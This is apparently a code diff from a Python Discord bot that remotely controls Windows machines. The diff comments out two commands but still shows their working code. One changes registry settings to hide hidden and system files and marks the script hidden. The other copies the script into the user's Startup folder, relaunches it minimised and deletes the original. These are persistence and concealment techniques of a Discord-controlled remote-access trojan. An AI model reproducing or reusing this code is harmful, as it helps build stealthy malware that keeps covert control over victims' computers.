-        os.system(f'attrib +h "{script_path}"')
-    except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")
-        
-@bot.command(help="Makes this script execute on logon (only user that ran this file, startup programs dont start if hidden, hence the now seperate command).")
-async def startup(ctx):
-    try:
-        script_path = sys.argv[0]
-        
-        startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    
-        if not os.path.exists(startup_folder):
-            os.makedirs(startup_folder)
-        
-        script_name = os.path.basename(script_path)
-        destination_path = os.path.join(startup_folder, script_name)
-    
-        shutil.copy(script_path, destination_path)
-    
-        print(f"Script '{script_name}' moved to the startup folder.")
-        await ctx.send(f"Moved '{script_name}' to the startup folder.")
-        
-        if script_path.endswith('.py') or script_path.endswith('.pyw'):
-            startup_command = f'cmd /C start /MIN pythonw "{destination_path}" & del "{script_path}"'
-        else:
-            startup_command = f'start /MIN "" "{destination_path}" & del "{script_path}"'
-        
-        subprocess.Popen(startup_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        
-        await ctx.send("Script started on startup successfully.")
-        sys.exit()
+# Disabled to prevent use, as it prevents the app from starting
 
-    except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")
+# @bot.command(help="Hides the script file and disables show hidden files (windows doesn't allow autostarting hidden files so be carefull).")
+# async def hidescript(ctx):
+#     try:
+#         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
+#         winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
+#         winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
+#         winreg.CloseKey(reg_key)
+#         script_path = sys.executable
+#         os.system(f'attrib +h "{script_path}"')
+#     except Exception as e:
+#         await ctx.send(f"Error executing command: {str(e)}")
+      
+# Depreciated in favor of the installer script      
+  
+# @bot.command(help="Makes this script execute on logon (only user that ran this file, startup programs dont start if hidden, hence the now seperate command).")
+# async def startup(ctx):
+#     try:
+#         script_path = sys.argv[0]
+#         
+#         startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+#     
+#         if not os.path.exists(startup_folder):
+#             os.makedirs(startup_folder)
+#         
+#         script_name = os.path.basename(script_path)
+#         destination_path = os.path.join(startup_folder, script_name)
+#     
+#         shutil.copy(script_path, destination_path)
+#     
+#         print(f"Script '{script_name}' moved to the startup folder.")
+#         await ctx.send(f"Moved '{script_name}' to the startup folder.")
+#         
+#         if script_path.endswith('.py') or script_path.endswith('.pyw'):
+#             startup_command = f'cmd /C start /MIN pythonw "{destination_path}" & del "{script_path}"'
+#         else:
+#             startup_command = f'start /MIN "" "{destination_path}" & del "{script_path}"'
+#         
+#         subprocess.Popen(startup_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+#         
+#         await ctx.send("Script started on startup successfully.")
+#         sys.exit()
+# 
+#     except Exception as e:
+#         await ctx.send(f"Error executing command: {str(e)}")
         
 @bot.command(help="Force stops the bot.")
 async def estop(ctx):
